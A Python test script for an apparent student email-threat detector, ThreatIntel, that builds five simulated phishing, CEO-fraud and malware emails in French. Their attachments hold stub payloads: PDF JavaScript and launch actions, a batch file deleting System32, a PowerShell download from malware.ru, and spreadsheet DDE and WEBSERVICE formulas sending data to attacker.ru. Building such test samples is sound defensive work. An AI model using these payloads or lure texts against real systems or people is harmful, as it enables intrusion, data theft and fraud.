"""
generate_test_emails.py
Génère 5 emails de test dangereux avec PJ simulées
pour tester ThreatIntel end-to-end.
Lance depuis la racine PFA_2/
"""
import asyncio
import zipfile
import io
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ─────────────────────────────────────────────────────────
# HELPERS — Génération PJ simulées
# ─────────────────────────────────────────────────────────

def make_pdf_with_js() -> bytes:
    """PDF minimal avec /JavaScript et /OpenAction — déclenche analyse statique."""
    pdf = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R/AA<</O 4 0 R>>>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
4 0 obj<</Type/Action/S/JavaScript/JS(app.alert('ThreatIntel Test - JS Detected');)>>endobj
5 0 obj<</Type/Action/S/Launch/Win<</F(cmd.exe)/P(/c calc.exe)>>>>endobj
xref
0 6
trailer<</Size 6/Root 1 0 R>>
startxref
0
%%EOF"""
    return pdf


def make_docx_with_vba() -> bytes:
    """DOCX minimal avec vbaProject.bin simulé + mots-clés BEC."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        # VBA project simulé
        z.writestr('word/vbaProject.bin', b'\xD0\xCF\x11\xE0' + b'\x00' * 100)
        # Document avec contenu BEC
        z.writestr('word/document.xml', """<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>
URGENT: Please process wire transfer of $50,000 immediately.
This is confidential. Do not contact anyone else.
Verify your account credentials and gift card details below.
Virement urgent requis avant fin de journee.
</w:t></w:r></w:p></w:body></w:document>""")
        # Relations avec lien externe
        z.writestr('word/_rels/document.xml.rels', """<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
Target="http://192.168.1.1/steal-credentials.php" TargetMode="External"/>
</Relationships>""")
        z.writestr('[Content_Types].xml', """<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Override PartName="/word/document.xml"
ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>""")
    return buf.getvalue()


def make_zip_with_executables() -> bytes:
    """ZIP contenant des fichiers avec extensions dangereuses."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('invoice_paid.exe',    b'MZ' + b'\x90' * 50 + b'This program cannot be run in DOS mode')
        z.writestr('update_now.bat',      b'@echo off\nrm -rf C:\\Windows\\System32\npowershell -enc aGVsbG8=')
        z.writestr('readme.ps1',          b'Invoke-WebRequest http://malware.ru/payload.exe -OutFile C:\\temp\\x.exe')
        z.writestr('document_real.pdf',   b'%PDF-1.4 legitimate looking content here')
        z.writestr('crack_software.scr',  b'MZ' + b'\x00' * 100)
    return buf.getvalue()


def make_xlsx_with_dde() -> bytes:
    """XLSX avec DDE et appel réseau dans formule."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('xl/vbaProject.bin', b'\xD0\xCF\x11\xE0' + b'\x00' * 50)
        z.writestr('xl/worksheets/sheet1.xml', """<?xml version="1.0"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData><row><c><f>=DDE("cmd","/c powershell -enc aGVsbG8=")</f></c>
<c><f>=WEBSERVICE("http://attacker.ru/steal?data="&A1)</f></c>
<c><f>=cmd|' /c calc'!A0</f></c>
</row></sheetData></worksheet>""")
        z.writestr('[Content_Types].xml', """<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
</Types>""")
    return buf.getvalue()


def make_pdf_embedded_file() -> bytes:
    """PDF avec fichier embarqué et AcroForm suspect."""
    pdf = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/AcroForm<</Action 5 0 R>>/Names<</EmbeddedFiles 6 0 R>>>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
4 0 obj<</Type/EmbeddedFile/Subtype/application#2Fx-msdownload>>endobj
5 0 obj<</Type/Action/S/JavaScript/JS(this.exportDataObject({cName:'malware.exe',nLaunch:2});)>>endobj
6 0 obj<</Names[(malware.exe) 4 0 R]>>endobj
xref
0 7
trailer<</Size 7/Root 1 0 R>>
startxref
0
%%EOF"""
    return pdf


# ─────────────────────────────────────────────────────────
# 5 EMAILS DE TEST
# ─────────────────────────────────────────────────────────

TEST_EMAILS = [

    # ── 1. Phishing bancaire classique ────────────────────
    {
        "label":   "Phishing bancaire — PDF malveillant",
        "subject": "⚠️ Votre compte bancaire a été suspendu — Action requise",
        "sender":  "security-alert@bna-bank-secure.ru",
        "to_header": "amira.bejaoui@enit.utm.tn",
        "cc_header": "",
        "body_text": """
Cher(e) client(e),

Nous avons détecté une activité suspecte sur votre compte BNA.
Votre accès a été temporairement suspendu pour votre sécurité.

CLIQUEZ ICI POUR VÉRIFIER VOTRE IDENTITÉ :
http://bit.ly/bna-verify-account-secure
http://185.220.101.47/bna/login.php

Vous devez compléter la vérification dans les 24 heures.
Fournissez votre mot de passe et numéro de carte bancaire via le formulaire.

Si vous ne vérifiez pas, votre compte sera définitivement fermé.

Cordialement,
Service Sécurité BNA
""",
        "attachments": [
            {"name": "verification_compte.pdf", "data": make_pdf_with_js()}
        ]
    },

    # ── 2. BEC — Usurpation directeur ────────────────────
    {
        "label":   "BEC — Usurpation direction + virement urgent",
        "subject": "Transfert confidentiel URGENT — ne pas ignorer",
        "sender":  "direction.generale@enit-utm.ru",
        "to_header": "amira.bejaoui@enit.utm.tn",
        "cc_header": "",
        "body_text": """
Bonjour Amira,

Je suis actuellement en réunion confidentielle et je ne peux pas être joint par téléphone.

J'ai besoin que vous effectuiez un virement urgent de 15 000 TND
vers le compte suivant AVANT 16h aujourd'hui.

RIB : 12 345 678 901 234 567 890
Banque : STB Tunis
Motif : Prestation confidentielle

C'est URGENT et CONFIDENTIEL. Ne contactez personne d'autre.
Envoyez-moi la confirmation par email uniquement.

Ne répondez pas à ce message, utilisez : dir.gen.enit@gmail.com

Cordialement,
Dr. Mohamed Ben Salem
Directeur Général — ENIT
""",
        "attachments": [
            {"name": "ordre_virement.docx", "data": make_docx_with_vba()}
        ]
    },

    # ── 3. Malware ZIP déguisé en facture ────────────────
    {
        "label":   "ZIP malveillant — exécutables cachés",
        "subject": "Facture impayée #INV-2024-8821 — Paiement requis sous 48h",
        "sender":  "facturation@invoices-pro-billing.xyz",
        "to_header": "amira.bejaoui@enit.utm.tn",
        "cc_header": "",
        "body_text": """
Madame, Monsieur,

Veuillez trouver ci-joint votre facture #INV-2024-8821 en attente de paiement.

Montant dû : 3 500,00 TND
Date limite : 48 heures

Si vous ne réglez pas cette facture, nous serons contraints d'engager
des poursuites judiciaires et de bloquer vos services.

Téléchargez et exécutez le document joint pour consulter les détails.

http://redirect.invoices-pro.xyz/download?id=8821&token=xK9mP2

Cordialement,
Service Facturation
invoices-pro-billing.xyz
""",
        "attachments": [
            {"name": "facture_8821.zip", "data": make_zip_with_executables()}
        ]
    },

    # ── 4. Phishing credentials — XLSX DDE ───────────────
    {
        "label":   "XLSX DDE + credential harvesting",
        "subject": "Mise à jour RH obligatoire — Complétez votre fiche salariale",
        "sender":  "rh-update@enit-portail-rh.tk",
        "to_header": "amira.bejaoui@enit.utm.tn",
        "cc_header": "",
        "body_text": """
Bonjour,

Dans le cadre de la mise à jour annuelle de nos systèmes RH,
vous êtes invité(e) à compléter et soumettre votre fiche salariale.

IMPORTANT : Activez les macros pour afficher le document correctement.

Votre login : amira.bejaoui
Mot de passe temporaire : changez-le ici → http://paypal-secure-verify.tk/reset

Complétez le fichier Excel ci-joint et renvoyez-le à cette adresse.
Délai : 24 heures sous peine de suspension de traitement de salaire.

http://192.168.100.1/rh/collect-data.php?user=amira

Service RH — ENIT
""",
        "attachments": [
            {"name": "fiche_salariale_2024.xlsx", "data": make_xlsx_with_dde()}
        ]
    },

    # ── 5. PDF embarqué + multi-signaux ──────────────────
    {
        "label":   "PDF embedded malware + multi-signaux",
        "subject": "Votre colis DHL est en attente — Confirmez votre adresse",
        "sender":  "noreply@dhl-delivery-confirm.ru",
        "to_header": "amira.bejaoui@enit.utm.tn",
        "cc_header": "",
        "body_text": """
Cher client DHL,

Votre colis #TN-DHL-2024-99871 est en attente de livraison.

Pour confirmer votre adresse et libérer votre colis, cliquez ici :
http://bit.ly/dhl-confirm-TN99871
http://dhl-delivery-confirm.ru/track?id=99871

ATTENTION : Sans confirmation dans 24h, le colis sera retourné à l'expéditeur.

Vous devrez payer des frais de douane de 45 TND via le lien sécurisé :
http://amazon-payment-secure.tk/pay?ref=DHL99871

Entrez vos informations bancaires pour finaliser la livraison.
Téléchargez le bon de livraison ci-joint et exécutez-le.

Service DHL Tunisie
""",
        "attachments": [
            {"name": "bon_livraison_DHL.pdf", "data": make_pdf_embedded_file()}
        ]
    },
]


# ─────────────────────────────────────────────────────────
# LANCEMENT
# ─────────────────────────────────────────────────────────
async def main():
    # Import ici pour éviter les prints de chargement avant le header
    from orchestrator import orchestrate

    print("\n" + "█" * 55)
    print("  THREATINTEL — Tests Emails Dangereux")
    print("  5 scénarios : phishing, BEC, ZIP, DDE, PDF")
    print("█" * 55)

    results = []
    for i, email in enumerate(TEST_EMAILS, 1):
        print(f"\n{'▓' * 55}")
        print(f"  TEST {i}/5 — {email['label']}")
        print(f"{'▓' * 55}")

        result = await orchestrate(email, reports_dir="reports/tests")
        scoring = result["scoring"]

        results.append({
            "label":      email["label"],
            "score":      scoring["score_final"],
            "verdict":    scoring["verdict"],
            "action":     scoring["action"],
            "hard_rule":  scoring.get("hard_rule", "—"),
            "probas":     scoring["probabilites"],
        })

    # ── Récap final ──────────────────────────────────────
    print("\n\n" + "═" * 55)
    print("  RÉCAPITULATIF — 5 TESTS")
    print("═" * 55)
    for r in results:
        print(f"\n  📧 {r['label'][:45]}")
        print(f"     Score   : {r['score']}/100")
        print(f"     Verdict : {r['verdict']}")
        print(f"     Règle   : {r['hard_rule']}")
        print(f"     Probas  : Sain={r['probas']['sain']}% | "
              f"Suspect={r['probas']['suspect']}% | "
              f"Danger={r['probas']['danger']}%")
    print("\n" + "═" * 55)

    # Score moyen détection
    danger_count  = sum(1 for r in results if r["action"] == "BLOCK")
    suspect_count = sum(1 for r in results if r["action"] == "QUARANTINE")
    print(f"\n  ✅ Détectés DANGER  : {danger_count}/5")
    print(f"  ⚠️  Détectés SUSPECT : {suspect_count}/5")
    print(f"  ❌ Manqués          : {5 - danger_count - suspect_count}/5")
    print("═" * 55)


if __name__ == "__main__":
    asyncio.run(main())